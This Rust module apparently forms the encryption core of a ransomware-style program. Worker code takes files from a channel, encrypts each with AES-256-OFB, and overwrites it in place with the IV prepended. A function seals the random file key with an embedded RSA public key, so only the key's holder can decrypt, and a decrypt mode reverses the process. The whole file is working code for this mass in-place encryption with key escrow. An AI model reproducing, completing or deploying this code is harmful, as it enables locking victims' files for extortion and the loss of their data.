use std::fs::DirEntry;
use std::fs::{read, write};

use crossbeam_channel::Receiver;
use openssl::rand::rand_bytes;
use openssl::rsa;
use openssl::symm::{decrypt, encrypt, Cipher};
use tracing::{event, Level};
use zeroize::Zeroize;

use crate::PUB_KEY;

/// generates a key using `openssl::rand::rand_bytes()` method
pub(crate) fn generate_random(bytes: usize) -> Vec<u8> {
    let mut key = vec![0_u8; bytes];
    rand_bytes(&mut key).unwrap();
    key
}

/// encrypts files from the `r` reciever using the provided `key`. Exits when it runs out of files to encrypt.
pub(crate) async fn encrypt_files(r: Receiver<DirEntry>, mut key: Vec<u8>, mode_encrypt: bool) {
    event!(Level::DEBUG, "Encryption worker started.");
    while !r.is_empty() {
        if let Ok(file) = r.recv() {
            event!(Level::DEBUG, "Processing file: {:?}", file);
            let content = read(file.path());
            if content.is_err() {
                event!(
                    Level::ERROR,
                    "Read error on file at path \"{:?}\"",
                    file.path()
                );
                continue;
            }
            let mut content: Vec<u8> = content.unwrap();

            if mode_encrypt {
                let iv = generate_random(32);
                match encrypt(
                    Cipher::aes_256_ofb(),
                    &key,
                    Some(&iv[0..32]),
                    content.as_ref(),
                ) {
                    Ok(mut output) => {
                        for i in 0..32 {
                            // insert IV to start of file
                            output.insert(0, iv[31 - i]);
                        }
                        let _ = write(file.path(), &output);
                        output.zeroize();
                    }
                    Err(error) => event!(
                        Level::ERROR,
                        "Encryption error {:?} on file at path \"{:?}\"",
                        error.errors(),
                        file.path()
                    ),
                }
                content.zeroize();
            } else {
                let iv: &Vec<u8> = &content[..32].to_vec();
                match decrypt(Cipher::aes_256_ofb(), &key, Some(&iv), &content[32..]) {
                    Ok(mut output) => {
                        let _ = write(file.path(), &output);
                        output.zeroize();
                    }
                    Err(error) => event!(
                        Level::ERROR,
                        "Decryption error {:?} on file at path \"{:?}\"",
                        error.errors(),
                        file.path()
                    ),
                }
                content.zeroize();
            }
        }
    }
    event!(
        Level::DEBUG,
        "Channel is empty, zeroing memory and killing worker."
    );
    key.zeroize();
}

/// wraps a key using the embedded `PUB_KEY` value
#[allow(clippy::ptr_arg)]
pub(crate) fn wrap_key(key: &Vec<u8>) -> Vec<u8> {
    // import key
    let rsa_key = rsa::Rsa::public_key_from_pem(PUB_KEY).unwrap();
    let p_key = openssl::pkey::PKey::from_rsa(rsa_key).unwrap();

    // find output size and pre-allocate buffer
    let encryptor = openssl::encrypt::Encrypter::new(&p_key).unwrap();
    let buffer_len = encryptor.encrypt_len(key).unwrap();
    let mut encrypted = vec![0u8; buffer_len];

    // Encrypt the data and discard its length. Return buffer.
    let _ = encryptor.encrypt(key, &mut encrypted).unwrap();
    encrypted
}
